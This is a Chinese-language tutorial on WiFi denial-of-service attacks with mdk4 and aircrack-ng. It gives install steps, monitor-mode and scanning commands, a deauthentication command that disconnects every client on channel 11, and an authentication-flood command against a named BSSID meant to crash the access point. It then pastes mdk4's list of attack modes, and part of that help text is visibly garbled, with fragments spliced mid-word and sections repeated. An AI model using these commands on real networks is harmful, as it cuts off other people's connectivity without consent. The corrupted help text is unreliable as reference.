Mdk3 已经不在维护，且它无法攻击 5Ghz 频段的 WiFi，而 Mdk4 加入了 5Ghz 频段的支持，当然用新不用旧。在实践中，WPA3 协议的 WIFI 对 Deauth 和泛洪攻击似乎免疫，多次尝试均是如此。而 WPA2 以及更低级的协议的 WIFI 能够轻易被攻击，产生显著效果。

## 安装

安装 `aircrack-ng` 和 `mdk4` ，Manjaro 可通过以下命令安装

```bash
yay -S aircrack-ng mdk4
```

## 使用

### 启用监听模式

```bash
sudo airmon-ng start wlp8s0
```
得到 wlp8s0mon 作为监听接口，执行攻击命令时均使用监听接口。

### 扫描无线网络

对 2.4Ghz 频段的 WiFi 扫描
```bash
sudo airodump-ng wlp8s0mon
```

对 5Ghz 频段的 WiFi 扫描，其中参数 `a` 表示 5Ghz 的 802.11a 标准，也可以是 `b` 和 `g` ，分别代表 802.11b 和 802.11g，他俩的频段为 2.4 Ghz
```bash
sudo airodump-ng --band a wlp8s0mon 
```

### 常用情景

Deauthentication 攻击，断掉信道为 11 无线网络的全部客户端连接。
```bash
sudo mdk4 wlp8s0mon d -c 11
```

身份验证攻击，攻击 BSSID 为 `AE:15:5d:ad:40:9b` 的接入点，使其崩溃重启
```bash
sudo mdk4 wlp8s0mon a -a AE:15:5d:ad:40:9b
```

### 攻击模式

一般也就用 a 和 d，用信标攻击太离谱太明显
```
ATTACK MODE b: Beacon Flooding
  Sends beacon frames to show fake APs at clients.
  This can sometimes crash network scanners and even drivers!
ATTACK MODE a: Authentication Denial-Of-Service
  Sends authentication frames to all APs found in range.
  Too many clients can freeze or reset several APs.
ATTACK MODE p: SSID Probing and Bruteforcing
  Probes APs and checks for answer, useful for checking if SSID has been correctly decloaked and if AP is in your sending range.
  Bruteforcing of hidden SSIDs with or without a wordlist is also available.
ATTACK MODE d: Deauthentication and Disassociation
  Sends deauthentication and disassociation packets to stations based on data traffic to disconnect all clients from an AP.
ATTACK MODE m: Michael Countermeasures Exploitation
  Sends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on TKIP APs.
  AP will then shutdown for a whole minute, making this an effective DoS.
ATTACK MODE e: EAPOL Start and Logoff Packet Injection
  Floods an AP with EAPOL Start frames to keep it busy with fake sessions and thus disables it to handle any legitimate clients. Or logs off clients by injecting fake EAPOL Logoff messages.
ATTACK MODE s: Attacks for IEEE 802.11s mesh networks
  Various attacks on link management and routing in mesh networks
  Flood neighbors and routes, create black holes and divert traffic!
ATTACK MODE w: WIDS Confusion
  Confuse/Abuse Intrusion Detection and Prevention Systems by cross-connecting clients to multiple WDS nodes or fake rogue APs.
ATTACK MODE f: Packet Fuzzer
  A simple packet fuzzer with multiple packet sources and a nice set of modifiers. Be careful!
ATTACK MODE x: Poc Testing
  Proof-of-concept of WiFi protocol implementation vulnerability, to test whether the device has wifi vulnerabilities.
  It may cause the wifi connection to be disconnected or the target device to crash.
```

	ATTACK MODE b: Beacon Flooding
	  Sends beacon frames to generate fake APs at clients.
	  This can sometimes crash network scanners and drivers!
	      -n <ssid>
		 Use SSID <ssid> instead of randomly generated ones

		 Read SSIDs from file
	      -v <filename>
		 Read MACs and SSIDs from file. See example file!
	      -t <adhoc>

		 Select if 11 Mbit (b) or 54 MBit (g) networks are created
		 Without this option, both types will be used.
	      -m
		 Use valid accesspoint MAC from built-in OUI database

		 Create fake networks on channel <c		ATTACK MODE f: Packet Fuzzer
	  A simple packet fuzzer with multiple packet sources
	  and a nice set of modifiers. Be careful!han>. If you want your card to

		 Add user-defined IE(s) in hexadecimal at the end of the tagged parameters
	      -s <pps>
		 Set speed in packets per second (Default: 50)

		 2: Change Source and BSSID (possibly resulting in Neighbor Flooding)
		 3: Cut packet short, leave 802.11 header intact (find buffer errors)
		 4: Shotgun mode, randomly overwriting bytes after header (find bugs)
		 5: Skript-kid's automated attack trying all of the above randomly :)

		 (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
	      -s <pps>
		 Set speed in packets per second (Default: 100)

	ATTACK MODE f: Packet Fuzzer
	  A simple packet fuzzer with multiple packet sources
	  and a nice set of modifiers. Be careful!
	  mdk4 randomly selects the given sources and one or multiple modifiers.
	      -s <sources>
		 Specify one or more of the following packet sources:
		 a - Sniff packets from the air
		 b - Create valid beacon frames with random SSIDs and properties
		 c - Create CTS frames to broadcast (you can also use this for a CTS DoS)
		 p - Create broadcast probe requests
	      -m <modifiers>
		 Select at least one of the modifiers here:
		 n - No modifier, do not modify packets
		 b - Set destination address to broadcast
		 m - Set source address to broadcast
		 s - Shotgun: randomly overwrites a couple of bytes
